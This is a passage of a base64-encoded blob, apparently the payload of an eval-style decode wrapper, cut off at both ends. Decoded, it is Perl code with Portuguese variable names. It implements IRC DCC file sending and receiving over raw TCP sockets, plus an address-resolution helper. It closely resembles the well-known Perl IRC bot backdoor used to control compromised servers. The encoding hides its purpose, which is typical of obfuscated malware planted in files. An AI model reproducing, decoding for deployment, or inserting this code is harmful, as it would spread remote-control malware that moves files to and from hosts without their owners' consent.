RfYnl0ZXM7DQogICAgICAgICAgcmVhZChTRU5ERklMRSwgJHNlbmRfYnl0ZXMsIDEwMjQpOw0KICAgICAgICAgIHByaW50ICRmaCAiJHNlbmRfYnl0ZXMiOw0KICAgICAgICAgIGNsb3NlKFNFTkRGSUxFKTsNCiAgICAgfQ0KICAgfQ0KfQ0KDQpzdWIgU0VORCB7DQogIG15ICgkbmljaywgJGFycXVpdm8pID0gQF87DQogIHVubGVzcyAoLXIgIiRhcnF1aXZvIikgew0KICAgIHJldHVybigwKTsNCiAgfQ0KICBteSAkZGNjYXJrID0gJGFycXVpdm87DQogICRkY2NhcmsgPX4gcy9bLipcL10oXFMrKS8kMS87DQogIG15ICRtZXVpcCA9ICQ6OmlyY19zZXJ2ZXJzeyIkOjpJUkNfY3VyX3NvY2tldCJ9eydtZXVpcCd9Ow0KICBteSAkbG9uZ2lwID0gdW5wYWNrKCJOIixpbmV0X2F0b24oJG1ldWlwKSk7DQogIG15IEBmaWxlc3RhdCA9IHN0YXQoJGFycXVpdm8pOw0KICBteSAkc2l6ZV90b3RhbD0kZmlsZXN0YXRbN107DQogIGlmICgkc2l6ZV90b3RhbCA9PSAwKSB7DQogICAgIHJldHVybigwKTsNCiAgfQ0KICBteSAoJHBvcnRhLCAkc2VuZHNvY2spOw0KICBkbyB7DQogICAgJHBvcnRhID0gaW50IHJhbmQoNjQ1MTEpOw0KICAgICRwb3J0YSArPSAxMDI0Ow0KICAgICRzZW5kc29jayA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhMaXN0ZW49PjEsIExvY2FsUG9ydCA9PiRwb3J0YSwgUHJvdG8gPT4gJ3RjcCcpIGFuZCAkZGNjX3NlbC0+YWRkKCRzZW5kc29jayk7DQogIH0gdW50aWwgJHNlbmRzb2NrOw0KICAkRENDeyRzZW5kc29ja317dGlwb30gPSAnc2VuZCc7DQogICREQ0N7JHNlbmRzb2NrfXtuaWNrfSA9ICRuaWNrOw0KICAkRENDeyRzZW5kc29ja317Ynl0ZXN9ID0gJHNpemVfdG90YWw7DQogICREQ0N7JHNlbmRzb2NrfXthcnF1aXZvfSA9ICRhcnF1aXZvOw0KICAmOjpjdGNwKCIkbmljayIsICJEQ0MgU0VORCAkZGNjYXJrICRsb25naXAgJHBvcnRhICRzaXplX3RvdGFsIik7DQp9DQpzdWIgR0VUIHsNCiAgbXkgKCRhcnF1aXZvLCAkZGNjbG9uZ2lwLCAkZGNjcG9ydGEsICRieXRlcywgJG5pY2spID0gQF87DQogIHJldHVybigwKSBpZiAoLWUgIiRhcnF1aXZvIik7DQogIGlmIChvcGVuKEZJTEUsICI+ICRhcnF1aXZvIikpIHsNCiAgICAgY2xvc2UgRklMRTsNCiAgfSBlbHNlIHsNCiAgICByZXR1cm4oMCk7DQogIH0NCiAgbXkgJGRjY2lwPWZpeGFkZHIoJGRjY2xvbmdpcCk7DQogIHJldHVybigwKSBpZiAoJGRjY3BvcnRhIDwgMTAyNCBvciBub3QgZGVmaW5lZCAkZGNjaXAgb3IgJGJ5dGVzIDwgMSk7DQogIG15ICRkY2Nzb2NrID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFByb3RvPT4idGNwIiwgUGVlckFkZHI9PiRkY2NpcCwgUGVlclBvcnQ9PiRkY2Nwb3J0YSwgVGltZW91dD0+MTUpIG9yIHJldHVybiAoMCk7DQogICRkY2Nzb2NrLT5hdXRvZmx1c2goMSk7DQogICRkY2Nfc2VsLT5hZGQoJGRjY3NvY2spOw0KICAkRENDeyRkY2Nzb2NrfXt0aXBvfSA9ICdnZXQnOw0KICAkRENDeyRkY2Nzb2NrfXtpdGltZX0gPSB0aW1lOw0KICAkRENDeyRkY2Nzb2NrfXtuaWNrfSA9ICRuaWNrOw0KICAkRENDeyRkY2Nzb2NrfXtieXRlc30gPSAkYnl0ZXM7DQogICREQ0N7JGRjY3NvY2t9e2N1cmJ5dGV9ID0gMDsNCiAgJERDQ3skZGNjc29ja317YXJxdWl2b30gPSAkYXJxdWl2bzsNCiAgJERDQ3skZGNjc29ja317aXB9ID0gJGRjY2lwOw0KICAkRENDeyRkY2Nzb2NrfXtwb3J0YX0gPSAkZGNjcG9ydGE7DQogICREQ0N7JGRjY3NvY2t9e3N0YXR1c30gPSAiUmVjZWJlbmRvIjsNCn0NCnN1YiBTdGF0dXMgew0KICBteSAkc29ja2V0ID0gc2hpZnQ7DQogIG15ICRzb2NrX3RpcG8gPSAkRENDeyRzb2NrZXR9e3RpcG99Ow0KICB1bmxlc3MgKGxjKCRzb2NrX3RpcG8pIGVxICJjaGF0Iikgew0KICAgIG15ICRuaWNrID0gJERDQ3skc29ja2V0fXtuaWNrfTsNCiAgICBteSAkYXJxdWl2byA9ICREQ0N7JHNvY2tldH17YXJxdWl2b307DQogICAgbXkgJGl0aW1lID0gJERDQ3skc29ja2V0fXtpdGltZX07DQogICAgbXkgJGZ0aW1lID0gdGltZTsNCiAgICBteSAkc3RhdHVzID0gJERDQ3skc29ja2V0fXtzdGF0dXN9Ow0KICAgICRmdGltZSA9ICREQ0N7JHNvY2tldH17ZnRpbWV9IGlmIGRlZmluZWQoJERDQ3skc29ja2V0fXtmdGltZX0pOw0KDQogICAgbXkgJGRfdGltZSA9ICRmdGltZS0kaXRpbWU7DQoNCiAgICBteSAkY3VyX2J5dGUgPSAkRENDeyRzb2NrZXR9e2N1cmJ5dGV9Ow0KICAgIG15ICRieXRlc190b3RhbCA9ICAkRENDeyRzb2NrZXR9e2J5dGVzfTsNCg0KICAgIG15ICRyYXRlID0gMDsNCiAgICAkcmF0ZSA9ICgkY3VyX2J5dGUvMTAyNCkvJGRfdGltZSBpZiAkY3VyX2J5dGUgPiAwOw0KICAgIG15ICRwb3JjZW4gPSAoJGN1cl9ieXRlKjEwMCkvJGJ5dGVzX3RvdGFsOw0KDQogICAgbXkgKCRyX2R1diwgJHBfZHV2KTsNCiAgICBpZiAoJHJhdGUgPX4gL14oXGQrKVwuKFxkKShcZCkoXGQpLykgew0KICAgICAgICRyX2R1diA9ICQzOyAkcl9kdXYrKyBpZiAkNCA+PSA1Ow0KICAgICAgICRyYXRlID0gIiQxXC4kMiIuIiRyX2R1diI7DQogICAgfQ0KICAgIGlmICgkcG9yY2VuID1+IC9eKFxkKylcLihcZCkoXGQpKFxkKS8pIHsNCiAgICAgICAkcF9kdXYgPSAkMzsgJHBfZHV2KysgaWYgJDQgPj0gNTsNCiAgICAgICAkcG9yY2VuID0gIiQxXC4kMiIuIiRwX2R1diI7DQogICAgfQ0KICAgIHJldHVybigiJHNvY2tfdGlwbyIsIiRzdGF0dXMiLCIkbmljayIsIiRhcnF1aXZvIiwiJGJ5dGVzX3RvdGFsIiwgIiRjdXJfYnl0ZSIsIiRkX3RpbWUiLCAiJHJhdGUiLCAiJHBvcmNlbiIpOw0KICB9DQogIHJldHVybigwKTsNCn0NCg0Kc3ViIGZpeGFkZHIgew0KICAgIG15ICgkYWRkcmVzcykgPSBAXzsNCg0KICAgIGNob21wICRhZGRyZXNzOw0KICAgIGlmICgkYWRkcmVzcyA9fiAvXlxkKyQvKSB7DQogICAgICAgIHJldHVybiBpbmV0X250b2EocGFjayAiTiIsICRhZGRyZXNzKTsNCiAgICB9IGVsc2lmICgkYWRkcmVzcyA9fiAvXlsxMl0/XGR7MSwyfVwuWzEyXT9cZHsxLDJ9XC5bMTJdP1xkezEsMn1cLlsxMl0/XGR7MSwyfSQvKSB7DQogICAgICAgIHJldHVybiAkYWRkcmVzczsNCiAgICB9IGVsc2lmICgkYWRkcmVzcyA9fiB0ci9hLXpBLVovLykgew0KICAgICAgICByZXR1cm4gaW5ldF9udG9hKCgoZ2V0aG9zdGJ5bmFtZSgkYWRkcmVzcykpWzRdKVswXSk7DQogICAgfSBlbHNlIHsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCn0='));